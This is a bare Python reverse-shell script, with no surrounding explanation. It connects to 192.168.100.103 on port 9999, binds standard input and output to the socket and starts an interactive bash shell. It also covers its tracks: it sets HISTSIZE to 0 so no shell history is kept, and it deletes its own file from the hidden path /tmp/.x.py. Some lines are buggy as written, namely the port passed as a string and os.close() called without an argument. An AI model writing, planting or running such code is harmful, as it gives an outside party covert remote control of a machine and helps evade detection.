#!/usr/bin/env python
# -*- coding:utf8 -*-


import os
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('192.168.100.103', '9999'))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.putenv('HISTSIZE', "0")
subprocess.call(['/bin/bash', '-i'])

os.close()

os.remove('/tmp/.x.py')

